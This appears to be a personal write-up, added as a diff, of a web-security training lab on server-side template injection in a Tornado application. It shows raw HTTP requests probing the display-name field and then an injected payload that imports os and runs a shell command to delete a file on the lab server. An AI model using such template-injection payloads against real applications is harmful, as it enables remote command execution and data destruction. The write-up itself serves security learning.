@@ -1,0 +1,50 @@
+Basic server-side template injection (code context)
+
+The solution provided is great. Once again, the lab description gives us a hint by saying the server uses Tornado. Doc page:
+https://www.tornadoweb.org/en/stable/template.html
+
+We test that in the change name template
+POST /my-account/change-blog-post-author-display HTTP/1.1
+Host: acaf1f3d1e2e422080485890006b001e.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+Origin: https://acaf1f3d1e2e422080485890006b001e.web-security-academy.net
+Connection: close
+Referer: https://acaf1f3d1e2e422080485890006b001e.web-security-academy.net/my-account?id=wiener
+Cookie: session=vBiyfATeW7bPPVoxRIa0ZhUl79lsuCiU
+Upgrade-Insecure-Requests: 1
+
+blog-post-author-display=user.first_name}}{{4-2}}&csrf=ljI29IASMguTxu8bQcz6kcHaaVaGCM54
+
+
+Then make a comment and look at our display name. It should Peter2
+
+Using the documentation page, we can see that {% somePython %} can be used to run code.
+
+Payload:
+{% import os %}
+{{os.system('rm /home/carlos/morale.txt')
+
+Request:
+
+POST /my-account/change-blog-post-author-display HTTP/1.1
+Host: acaf1f3d1e2e422080485890006b001e.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 142
+Origin: https://acaf1f3d1e2e422080485890006b001e.web-security-academy.net
+Connection: close
+Referer: https://acaf1f3d1e2e422080485890006b001e.web-security-academy.net/my-account?id=wiener
+Cookie: session=vBiyfATeW7bPPVoxRIa0ZhUl79lsuCiU
+Upgrade-Insecure-Requests: 1
+
+blog-post-author-display=user.first_name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')&csrf=ljI29IASMguTxu8bQcz6kcHaaVaGCM54
+
+Done.
